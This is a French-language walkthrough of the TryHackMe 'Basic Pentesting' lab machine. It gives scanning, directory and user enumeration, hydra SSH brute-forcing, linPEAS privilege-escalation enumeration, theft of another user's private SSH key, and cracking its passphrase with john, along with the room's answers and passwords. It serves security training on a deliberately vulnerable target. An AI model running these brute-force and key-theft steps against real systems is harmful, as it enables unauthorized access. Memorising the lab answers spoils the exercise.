
# Tuto Pentest 0x01 : Basic Pentesting - Walkthrough

https://tryhackme.com/room/basicpentestingjt


## #1 Deploy the machine and connect to our network


Déployer la machine et se connecter via OpenVPN

```sh
sudo openvpn ~/Downloads/$USER.ovpn
``` 

## #2 Find the services exposed by the machine

Ouvrir un nouveau terminal

### Attendre que la machine soit UP

```sh
mkdir basicpentesting
cd basicpentesting
export IP=10.10.216.216
ping $TARGET
```

### Recherche des ports ouvert, des services associés, ...

```sh
$ nmap -T4 -sC -sV -oN nmap.txt $IP
```

```sh
Nmap scan report for 10.10.216.216
Host is up (0.034s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-04-24T11:57:59-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-24T15:57:59
|_  start_date: N/A
```

Le serveur expose un serveur web, ouvrir le site avec un navigateur : http://$IP/ 

Le site en maintenance ... 

Afficher le code source de la page web

```html
<!-- Check our dev note section if you need to know what to work on. -->
```

## #3 What is the name of the hidden directory on the web server(enter name without /)?

Ouvrir un nouveau terminal

```sh
export IP=10.10.216.216
```

Scan des dossiers "web" par brute force

```sh
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP/ | tee dirbuster.txt
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.216.216/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/24 12:02:38 Starting gobuster
===============================================================
/development (Status: 301)
(...)
```

Il existe un dossier `development` l'ouvrir dans un navigateur : http://$IP/development

OK, il y a deux fichiers.

`dev.txt`
```txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

`j.txt`
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

OK, on apprends que "J" a un mot passe crackable !

> Réponse : **development**

## #4 User brute-forcing to find the username & password

Il nous faut trouver un nom d'utilisateur et le mot passe associé ...

## # What is the username? 

Enumeration des information "Windows/Samba" (shares, users, ...)

```sh
enum4linux -a $IP | tee enum.txt
```

```
(...)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

OK, on a deux nom d'utilisateurs : `jan` et `kay`

> Réponse : **jan**

## #6 What is the password?

On sait que le mot de passe de `jan` dans `/etc/passwd` est crackable.

Brute force SSH du mot de passe via `hydra` en utlisant le dictionnaire de mot de passe `rockyou`

(optionnel) Décompresser le fichier `/usr/share/wordlists/rockyou.txt.gz` 

```sh
cd /usr/share/wordlists
sudo gzip -d rockyou.txt.gz
```

```sh
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP | tee hydra.txt
```

```

```

> Réponse : **armando**

Test de lonnexion en SSH

```sh
ssh jan@10.10.216.216
```
```sh
The authenticity of host '10.10.216.216 (10.10.216.216)' can't be established.
ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.216.216' (ECDSA) to the list of known hosts.
jan@10.10.216.216's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

(...) 

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```

OK, ça marche !

Vérification des droits

```sh
jan@basic2:/home/kay/.ssh$ id
uid=1001(jan) gid=1001(jan) groups=1001(jan)
```

Sudo possible ?

```sh
jan@basic2:/home/kay/.ssh$ sudo -s
[sudo] password for jan: 
jan is not in the sudoers file.  This incident will be reported.
```

## #7 What service do you use to access the server(answer in abbreviation in all caps)?

> Réponse : **SSH**

## #8 Enumerate the machine to find any vectors for privilege escalation

Ouvrir un nouveau teminal

```sh
export IP=10.10.216.216
```

Télécharger linPEAS

```sh
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```

Copier le script sur la cible

```sh
scp linpeas.sh jan@$IP:/dev/shm
```

Basculer dans le terminal avec la session SSH ouverte sur le serveur.

```sh
cd /dev/shm
chmod +x linpeas.sh
./linpeas.sh | tee linlog.txt
```

Analyse du log linPEAS, vérifier les lignes en rouge

```sh
cat linlog.txt | more
```

```sh
[+] Looking for ssl/ssh files
(...)
Private SSH keys found!:
/home/kay/.ssh/id_rsa
```

OK, la clé privé RSA de `kay` est accessible !!!

## #9 What is the name of the other user you found(all lower case)?

> Réponse: *kay*

## #10 If you have found another user, what can you do with this information? 

Basculer dans un terminal Kali

Récupération de la clé privée

```sh
scp jan@$IP:/home/kay/.ssh/id_rsa ./kay_id_rsa
```

Ajustement des droits de la clé privée (600)

```sh
chmod 600 kay_id_rsa
```

Test de connexion SSH avec le compte `kay` et la clé privée.

```sh
ssh -i kay_id_rsa kay@$IP
Enter passphrase for key 'kay_id_rsa': 
```

La clé est protégée par un mot de passe !

Extraction du mot de passe de la clé Privé pour brute forcer le mot passe avec `john`.

```sh
/usr/share/john/ssh2john.py kay_id_rsa > pk_pass.txt
```

Brute force via `john` en utlisant le dictionnaire de mot de passe `rockyou`

```sh
sudo john pk_pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```sh
(...)
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)
```

OK, le mot de passe est `beeswax`

Test de connexion SSH avec le compte `kay` et la clé privée.

```sh
ssh -i kay_id_rsa kay@$IP
```

OK, on est connecté !

```sh
kay@basic2:~$ ls -al
(...)
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
```

Un beau fichier `pass.bak` !

```sh
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

## #11 What is the final password you obtain?

> Réponse: **heresareallystrongpasswordthatfollowsthepasswordpolicy$$**


`--EOF`